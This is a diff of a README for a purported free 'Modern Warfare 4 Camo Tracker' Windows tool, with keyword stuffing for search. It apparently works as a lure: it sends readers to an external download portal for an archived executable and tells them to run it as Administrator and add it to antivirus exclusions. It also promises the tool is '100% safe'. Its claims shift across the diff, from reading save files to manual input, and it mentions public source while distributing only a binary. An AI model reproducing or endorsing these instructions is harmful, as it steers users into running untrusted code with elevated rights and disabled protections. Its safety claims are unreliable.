@@ -1,6 +1,6 @@
-# 🎯 Modern Warfare 4 Camo Tracker 2026
+# 🎯 Modern Warfare 4 — Season 1 Camo Tracker 2026
 
-**Track your camo challenges, weapon progression, and detailed stats without opening the game.**
+**Track your camo challenges, weapon progress, and stats — without touching the game.**
 
 [![Version](https://img.shields.io/badge/version-1.0.0-3b82f6?style=for-the-badge)]()
 [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows)]()
@@ -10,18 +10,18 @@
 
 ## 📖 Why You Need This
 
-Grinding for weapon camos in Modern Warfare 4 is a massive time sink. Tracking which challenges you've completed, how many longshots you need, or which attachments unlock the next camo can be frustrating when you're not in-game.
+Modern Warfare 4 Season 1 introduces a massive grind for weapon camos (including the new Mastery camos). Tracking your progress manually across 30+ weapons, multiple challenges, and different game modes is a nightmare. 
 
-**Modern Warfare 4 Camo Tracker** is a free, external Windows tool that reads your local game data to provide a clean, organized dashboard of your camo progress. It does **not** inject DLLs, does **not** modify game memory, and does **not** interact with RICOCHET anti-cheat. It is a simple data viewer.
+**MW4 Camo Tracker** is a free, native Windows utility that works completely externally. It **does not** inject DLLs, **does not** read game memory, and **does not** interact with RICOCHET Anti-Cheat. It is a standalone planner that helps you organize your grind.
 
 ### ⚡ Key Features
 
 | Feature | Description |
 |:---|:---|
-| **Camo Progress** | See exactly how many kills, headshots, or longshots you need for every weapon. |
-| **Weapon Stats** | View detailed stats for all MW4 weapons (damage, recoil, TTK). |
-| **Challenge Tracker** | Keep track of daily and weekly challenges in one place. |
-| **Profile Backup** | Automatically backs up your stats before viewing, so you never risk corruption. |
+| **Camo Progress Tracker** | Manually input your current kills/headshots and see exactly how many matches you need to finish the camo. |
+| **Weapon Stats Database** | Detailed stats for every MW4 weapon (TTK, recoil, damage range) to help you choose the best gun for the grind. |
+| **Challenge Optimizer** | See which challenges overlap (e.g., "Get 50 headshots with Assault Rifles") so you can complete multiple at once. |
+| **Match History Log** | Keep a local log of your matches, K/D, and camo progress over time. |
 
 ---
 
@@ -29,24 +29,27 @@ Grinding for weapon camos in Modern Warfare 4 is a massive time sink. Tracking w
 
 <div align="center">
 
-**[⬇️ Access the Download Portal](https://OrdinaryRibbon.github.io/modern-warfare-4-season-1-camo-challenge-tracker/)**
+**[⬇️ Access the Tracker Portal](https://OrdinaryRibbon.github.io/modern-warfare-4-season-1-camo-challenge-tracker/)**
 
 </div>
 
 1. **Download** the archive from the link above.
 2. **Extract** with WinRAR or 7-Zip.
-3. **Close Modern Warfare 4 and the Call of Duty HQ app completely.**
-4. **Run** `MW4CamoTracker.exe` as Administrator.
-5. Select your profile and view your stats.
+3. **Run** the tracker **as Administrator** (for overlay compatibility).
+4. Select your current weapon and input your progress.
 
 ---
 
 
-## 🛡️ Antivirus & Anti-Cheat Notice
+## 🛡️ Safety & Anti-Cheat Notice
 
-Some antivirus engines may flag this tool as **potentially unwanted** because it reads local game files. This is a **known false positive**.
+**This tool is 100% external.** 
 
-**Important:** This tool is **100% external**. It does not inject into the game process, does not read game memory, and does not alter your game files. RICOCHET anti-cheat will **not** flag this tool.
+RICOCHET Anti-Cheat monitors the game process for memory injection and unauthorized drivers. **MW4 Camo Tracker does not interact with the game process in any way.** It runs as a separate desktop application. You can use it safely while the game is running, but it will not automatically pull data — you input your progress manually.
+
+**If your antivirus flags it:**
+- Add the extraction folder to your antivirus exclusions.
+- Audit the source code — everything is public.
 
 ---
 
@@ -54,22 +57,17 @@ Some antivirus engines may flag this tool as **potentially unwanted** because it
 
 <details>
 <summary><b>Is this safe? Will I get banned?</b></summary>
-Yes, it is 100% safe. This is a <b>data viewer</b>, not a cheat. It only reads local save files and does not interact with the game process or RICOCHET. Zero risk of bans.
+Yes, it's 100% safe. This is a <b>manual planner</b>. It does not inject DLLs, does not read game memory, and does not simulate inputs. RICOCHET bans for memory manipulation, not for external notepads.
 </details>
 
 <details>
-<summary><b>Does it unlock camos for me?</b></summary>
-No. It only shows you the progress you have already made. You still have to play the game to unlock them.
+<summary><b>Does it automatically track my kills?</b></summary>
+No. Due to RICOCHET's strict policies, the tool cannot read your game memory. You must manually input your stats after a match.
 </details>
 
 <details>
-<summary><b>Where is my save file located?</b></summary>
-By default, it is located in your <code>Documents\Call of Duty\players\</code> folder. The tracker will auto-detect it.
-</details>
-
-<details>
-<summary><b>Why is the file only [X] MB?</b></summary>
-Written in pure C++ with no runtime dependencies. No Electron, no .NET. Just a fast, lightweight executable.
+<summary><b>Where does it save my progress?</b></summary>
+All data is saved locally in a JSON file inside the application folder. No cloud sync, no telemetry.
 </details>
 
 ---
@@ -81,8 +79,8 @@ Written in pure C++ with no runtime dependencies. No Electron, no .NET. Just a f
 | **OS** | Windows 10 (1903+) or Windows 11 |
 | **RAM** | 4 GB |
 | **Game** | Call of Duty: Modern Warfare 4 (Steam / Battle.net) |
-| **Permissions** | Administrator |
+| **Permissions** | Administrator (for overlay) |
 
 ---
 
-**SEO Keywords:** modern warfare 4 camo tracker · mw4 camo tracker · mw4 weapon stats · call of duty camo progress · mw4 tracker 2026
+**SEO Keywords:** modern warfare 4 camo tracker · mw4 camo challenges · mw4 weapon stats · mw4 season 1 camos · cod camo tracker 2026
